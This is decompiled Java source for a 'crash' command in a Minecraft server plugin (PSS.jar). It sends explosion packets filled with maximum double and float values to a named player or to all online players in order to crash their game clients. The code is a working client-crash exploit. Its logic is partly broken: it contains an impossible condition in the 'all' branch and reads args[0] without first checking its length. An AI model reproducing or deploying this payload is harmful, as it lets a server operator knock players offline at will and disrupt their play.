/*    */
package de.bypixels.pss.commands;
/*    */
/*    */

import de.bypixels.pss.pss.Main;
import de.bypixels.pss.util.Messages;
import de.bypixels.pss.util.Settings;

import net.minecraft.server.v1_12_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_12_R1.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;


/*    */ public class CMDcrash implements CommandExecutor
        /*    */ {
    /*    */   private Main plugin;

    /*    */
    /*    */
    public CMDcrash(Main plugin)
    /*    */ {
        /* 25 */
        this.plugin = plugin;
        /*    */
    }

    /*    */
    /*    */
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
    /*    */ {
        /* 30 */
        if (Settings.cfg.getBoolean("crash") == true) {
            if ((sender instanceof Player)) {
                /* 31 */
                Player p = (Player) sender;
                /* 32 */

                /* 33 */
                if (!p.hasPermission("pss.crash")) {
                    /* 34 */
                    String msg = Settings.cfg.getString("permissions");
                    /* 35 */
                    p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg));
                    /* 36 */
                    return true;
                }
                /*    */
                String msg;
                /* 38 */
                if (args.length == 0) {
                    /* 39 */
                    String msg1 = Main.prefix + Messages.cfg.getString("crash1");
                    /* 40 */
                    p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                    /*    */
                } else {
                    /* 42 */
                    if (args.length == 1) {
                        /* 43 */
                        if (args[0].equalsIgnoreCase("all"))
                            /*    */ {
                            /* 45 */
                            for (Player all : Bukkit.getServer().getOnlinePlayers()) {
                                /* 46 */
                                if ((all.equals(p)) && (!all.equals(p))) {

                                    /* 48 */
                                    ((CraftPlayer) all).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                                    /* 49 */
                                    String msg1 = Main.prefix + Messages.cfg.getString("crash3");
                                    /* 50 */
                                    p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                                    /* 51 */
                                    return true;
                                    /*    */
                                }
                                /*    */
                            }
                            /*    */
                        }
                        /*    */
                        else {
                            /* 56 */
                            Player target = Bukkit.getServer().getPlayer(args[0]);
                            /* 57 */
                            if (target != null)
                                /*    */ {
                                /* 59 */
                                ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                                /* 60 */
                                String msg1 = Main.prefix + Messages.cfg.getString("crash2");
                                /* 61 */
                                p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                                /* 62 */
                                return true;
                                /*    */
                            }
                            /* 64 */
                            String msg1 = Main.prefix + Messages.cfg.getString("online");
                            /* 65 */
                            p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                            /* 66 */
                            return true;
                            /*    */
                        }
                        /*    */
                    }
                    /*    */
                    /* 70 */
                    String msg1 = Main.prefix + Messages.cfg.getString("crash1");
                    /* 71 */
                    p.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                    /* 72 */
                    return true;
                    /*    */
                }
                /*    */
            } else {

            }
            /*    */
        }
        /*    */
        else {
            /* 77 */
            /* 43 */
            if (args[0].equalsIgnoreCase("all"))
                /*    */ {
                /* 45 */
                for (Player all : Bukkit.getServer().getOnlinePlayers()) {
                    /* 46 */


                        /* 48 */
                        ((CraftPlayer) all).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                        /* 49 */
                        String msg1 = Main.prefix + Messages.cfg.getString("crash3");
                        /* 50 */
                        Bukkit.getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                        /* 51 */
                        return true;
                        /*    */

                    /*    */
                }
                /*    */
            }
            /*    */
            else {
                /* 56 */
                if (args.length == 1) {
                    Player target = Bukkit.getServer().getPlayer(args[0]);
                    /* 57 */
                    if (target != null)
                        /*    */ {
                        /* 59 */
                        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                        /* 60 */
                        String msg1 = Main.prefix + Messages.cfg.getString("crash2");
                        /* 61 */
                        Bukkit.getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                        /* 62 */
                        return true;
                        /*    */
                    }
                    /* 64 */
                    String msg1 = Main.prefix + Messages.cfg.getString("online");
                    /* 65 */
                    Bukkit.getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                    /* 66 */
                    return true;
                    /*    */
                }else{
                    String msg1 = Main.prefix + Messages.cfg.getString("arguments");
                    /* 65 */
                    Bukkit.getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', msg1));
                }
            }
            /*    */
        }
        /* 81 */
        return false;
        /*    */
    }
    /*    */
}


/* Location:              C:\Users\Daniel\Downloads\PSS.jar!\Commands\CMDcrash.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */